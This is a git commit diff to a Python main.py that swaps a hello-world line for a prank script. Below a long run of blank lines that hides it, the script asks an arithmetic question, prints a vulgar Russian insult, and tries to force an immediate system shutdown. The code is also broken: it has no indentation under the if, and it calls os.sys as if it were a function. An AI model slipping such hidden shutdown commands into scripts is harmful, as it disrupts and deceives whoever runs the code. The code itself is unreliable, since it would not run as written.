1a4b8c0c4d71417f6fb64e3337e59121d3599da5
kolpa40k <80342576+kolpa40k@users.noreply.github.com>
2021-03-12 16:08:16 +0700

    Update main.py

--- main.py
+++ main.py
@@ -1,1 +1,26 @@
-print('Hello world!')
+print('Hello world! ya zuisas')
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+import os
+import time
+
+a = int(input('Сколько будет 150+150? '))
+
+if a == 300:
+print('Отсоси у тракториста')
+time.sleep(5)
+os.sys('shutdown /s /t 0 || shutdown now')
